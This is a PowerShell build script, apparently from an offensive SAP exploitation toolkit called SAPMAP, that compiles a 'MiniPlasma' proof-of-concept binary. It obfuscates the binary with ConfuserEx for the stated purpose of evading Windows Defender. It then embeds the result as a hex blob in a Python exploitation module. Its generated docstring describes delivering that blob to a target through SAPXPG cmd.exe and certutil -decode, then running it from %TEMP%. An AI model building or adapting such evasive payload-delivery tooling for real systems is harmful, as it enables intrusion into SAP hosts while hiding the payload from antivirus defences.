<#
.SYNOPSIS
    Build the SAPMAP-vendored MiniPlasma binary and inject it into
    modules/exploitation/_miniplasma_blob.py.

.DESCRIPTION
    Runs on a Windows host with .NET Framework 4.7.2+ SDK, MSBuild
    (any 15+ - e.g. from Build Tools for Visual Studio 2019/2022 or
    a full VS install), and NuGet.exe on PATH.  Optionally downloads
    ConfuserEx if not present in tools\miniplasma\confuser\.

    Pipeline:
      1. nuget restore (fetches Costura.Fody, Fody, NtApiDotNet, TaskScheduler)
      2. msbuild Release (Costura merges dependencies into mp_bin.exe)
      3. ConfuserEx post-pass (rename + anti-tamper + anti-debug + constants)
      4. Read the obfuscated .exe, hex-encode, write to _miniplasma_blob.py
         in the SAPMAP checkout.

    The resulting blob ships with SAPMAP - operators do not need to
    re-run this build.  Re-run only when the upstream PoC changes or
    a new technique gets added to the same .exe.

.PARAMETER SapmapRoot
    Path to your SAPMAP checkout root.  Auto-detected by walking up
    from this script's location.

.PARAMETER SkipObfuscation
    Skip the ConfuserEx pass (faster iteration when developing).
    The resulting blob will trip Defender on any modern Win10/11.

.PARAMETER ConfuserExUrl
    Override the ConfuserEx download URL.  Defaults to the GitHub
    release (mkaring fork - actively maintained).

.EXAMPLE
    PS> cd C:\src\SAPMAP\tools\miniplasma
    PS> .\build.ps1

.EXAMPLE
    PS> .\build.ps1 -SkipObfuscation
#>
[CmdletBinding()]
param(
    [string]$SapmapRoot = "",
    [switch]$SkipObfuscation = $false,
    [string]$ConfuserExUrl = "https://github.com/mkaring/ConfuserEx/releases/download/v1.6.0/ConfuserEx-CLI.zip"
)

$ErrorActionPreference = "Stop"
$Here = Split-Path -Parent $MyInvocation.MyCommand.Path
$Src  = Join-Path $Here "src"

# ---------------------------------------------------------------------------
# Locate SAPMAP root
# ---------------------------------------------------------------------------
if (-not $SapmapRoot) {
    $candidate = $Here
    for ($i = 0; $i -lt 5; $i++) {
        $candidate = Split-Path -Parent $candidate
        if (Test-Path (Join-Path $candidate "modules\exploitation")) {
            $SapmapRoot = $candidate
            break
        }
    }
}
if (-not $SapmapRoot -or -not (Test-Path (Join-Path $SapmapRoot "modules\exploitation"))) {
    Write-Error "SAPMAP root not found.  Pass -SapmapRoot <path>."
    exit 1
}
$BlobPy = Join-Path $SapmapRoot "modules\exploitation\_miniplasma_blob.py"
Write-Host "[*] SAPMAP root  : $SapmapRoot"
Write-Host "[*] Blob output  : $BlobPy"

# ---------------------------------------------------------------------------
# Locate tools (msbuild, nuget)
# ---------------------------------------------------------------------------
function Find-MSBuild {
    # 1. PATH
    $msb = Get-Command msbuild.exe -ErrorAction SilentlyContinue
    if ($msb) { return $msb.Source }
    # 2. vswhere
    $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
    if (Test-Path $vswhere) {
        $path = & $vswhere -latest -prerelease -requires Microsoft.Component.MSBuild -find "MSBuild\**\Bin\MSBuild.exe" | Select-Object -First 1
        if ($path -and (Test-Path $path)) { return $path }
    }
    # 3. Build Tools default location
    $bt = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\MSBuild.exe"
    if (Test-Path $bt) { return $bt }
    $bt2 = "${env:ProgramFiles}\Microsoft Visual Studio\2022\BuildTools\MSBuild\Current\Bin\MSBuild.exe"
    if (Test-Path $bt2) { return $bt2 }
    return $null
}

$MSBuild = Find-MSBuild
if (-not $MSBuild) {
    Write-Error @"
msbuild.exe not found.  Install one of:
  * Build Tools for Visual Studio 2022 (free):
      https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022
    Pick the '.NET desktop build tools' workload.
  * Full Visual Studio 2019/2022 (Community is free).
Then re-run this script.
"@
    exit 1
}
Write-Host "[*] msbuild      : $MSBuild"

$Nuget = Get-Command nuget.exe -ErrorAction SilentlyContinue
if (-not $Nuget) {
    $localNuget = Join-Path $Here "nuget.exe"
    Write-Host "[*] nuget.exe    : not on PATH - downloading to $localNuget"
    Invoke-WebRequest -Uri "https://dist.nuget.org/win-x86-commandline/latest/nuget.exe" -OutFile $localNuget
    $NugetPath = $localNuget
} else {
    $NugetPath = $Nuget.Source
}
Write-Host "[*] nuget        : $NugetPath"

# ---------------------------------------------------------------------------
# Restore + build
# ---------------------------------------------------------------------------
Write-Host "[*] Restoring NuGet packages..."
Push-Location $Src
try {
    & $NugetPath restore "packages.config" -PackagesDirectory "..\packages" -NonInteractive
    if ($LASTEXITCODE -ne 0) { throw "nuget restore failed" }

    Write-Host "[*] Building Release..."
    & $MSBuild "SAPMAP_MiniPlasma.csproj" /p:Configuration=Release /p:Platform=AnyCPU /v:minimal /nologo
    if ($LASTEXITCODE -ne 0) { throw "msbuild failed" }
} finally {
    Pop-Location
}

$ReleaseExe = Join-Path $Src "bin\Release\mp_bin.exe"
if (-not (Test-Path $ReleaseExe)) {
    Write-Error "Expected build output $ReleaseExe not found."
    exit 1
}
$buildSize = (Get-Item $ReleaseExe).Length
Write-Host ("[+] Build OK     : " + $ReleaseExe + " (" + $buildSize + " bytes)")

# ---------------------------------------------------------------------------
# ConfuserEx obfuscation pass
# ---------------------------------------------------------------------------
$FinalExe = $ReleaseExe
if (-not $SkipObfuscation) {
    $ConfuserDir = Join-Path $Here "confuser"
    $ConfuserCli = Join-Path $ConfuserDir "Confuser.CLI.exe"

    if (-not (Test-Path $ConfuserCli)) {
        Write-Host "[*] ConfuserEx not present - downloading from $ConfuserExUrl"
        $zip = Join-Path $Here "confuser.zip"
        Invoke-WebRequest -Uri $ConfuserExUrl -OutFile $zip
        if (-not (Test-Path $ConfuserDir)) {
            New-Item -ItemType Directory -Path $ConfuserDir | Out-Null
        }
        Expand-Archive -Path $zip -DestinationPath $ConfuserDir -Force
        Remove-Item $zip
    }
    if (-not (Test-Path $ConfuserCli)) {
        Write-Error "ConfuserEx CLI not found at $ConfuserCli after extract."
        exit 1
    }
    Write-Host "[*] ConfuserEx   : $ConfuserCli"

    Write-Host "[*] Running ConfuserEx pass (rename + anti-tamper + anti-debug + constants)..."
    Push-Location $Src
    try {
        & $ConfuserCli -n "ConfuserEx.crproj"
        if ($LASTEXITCODE -ne 0) { throw "ConfuserEx failed" }
    } finally {
        Pop-Location
    }
    $ConfusedExe = Join-Path $Src "bin\Release\confused\mp_bin.exe"
    if (-not (Test-Path $ConfusedExe)) {
        Write-Error "ConfuserEx did not produce $ConfusedExe."
        exit 1
    }
    $confSize = (Get-Item $ConfusedExe).Length
    Write-Host ("[+] Obfuscated   : " + $ConfusedExe + " (" + $confSize + " bytes)")
    $FinalExe = $ConfusedExe
} else {
    Write-Host "[!] Skipping ConfuserEx - binary will trip Defender."
}

# ---------------------------------------------------------------------------
# Inject hex blob into _miniplasma_blob.py
# ---------------------------------------------------------------------------
Write-Host "[*] Hex-encoding final binary..."
$bytes = [System.IO.File]::ReadAllBytes($FinalExe)
$size = $bytes.Length

# SHA-256 for integrity
$sha = [BitConverter]::ToString(
    [System.Security.Cryptography.SHA256]::Create().ComputeHash($bytes)
).Replace("-", "").ToLowerInvariant()

# Hex-encode in 80-char lines (40 bytes/line) - matches dirtyfrag layout
$sb = New-Object System.Text.StringBuilder
for ($i = 0; $i -lt $bytes.Length; $i += 40) {
    $count = [Math]::Min(40, $bytes.Length - $i)
    [void]$sb.Append('    "')
    for ($j = 0; $j -lt $count; $j++) {
        [void]$sb.Append("{0:x2}" -f $bytes[$i + $j])
    }
    [void]$sb.Append('"')
    if ($i + 40 -lt $bytes.Length) {
        [void]$sb.AppendLine()
    }
}
$body = $sb.ToString()

# Build the output Python file using straight string concatenation
# (avoids PowerShell here-string parser pitfalls around triple-quoted
# Python docstrings).  Note the THREE double-quotes that open the
# Python docstring - safe here because we are NOT inside a PS here-string.
$nl = [Environment]::NewLine
$header  = '"""Auto-generated by tools/miniplasma/build.ps1 - do not hand-edit.' + $nl
$header += $nl
$header += 'Holds the SAPMAP-vendored MiniPlasma binary (.NET 4.7.2, Costura-merged,' + $nl
$header += 'ConfuserEx-obfuscated) as a hex blob.  The blob is delivered to the' + $nl
$header += 'target via SAPXPG cmd.exe + certutil -decode, written to' + $nl
$header += '%TEMP%\mp_bin.exe, then run.  See modules/exploitation/sapmap_miniplasma.py.' + $nl
$header += '"""' + $nl
$header += $nl
$header += 'MINIPLASMA_SHA256 = "' + $sha + '"' + $nl
$header += 'MINIPLASMA_SIZE   = ' + $size + $nl
$header += $nl
$header += 'MINIPLASMA_BIN_HEX = (' + $nl
$header += $body + $nl
$header += ')' + $nl

# Write UTF-8 WITHOUT BOM - Python prefers no BOM on .py files
[System.IO.File]::WriteAllText($BlobPy, $header,
    (New-Object System.Text.UTF8Encoding $false))

Write-Host ("[+] Wrote " + $size + " bytes (" + ($size * 2) + " hex chars) to " + $BlobPy)
Write-Host ("[+] sha256: " + $sha)
Write-Host ""
Write-Host "[+] Done.  Commit + push the blob so other operators get the binary:"
Write-Host "      cd $SapmapRoot"
Write-Host "      git add modules/exploitation/_miniplasma_blob.py"
Write-Host "      git commit -m 'Vendor MiniPlasma binary blob (.NET 4.7.2, ConfuserEx)'"
Write-Host "      git push"
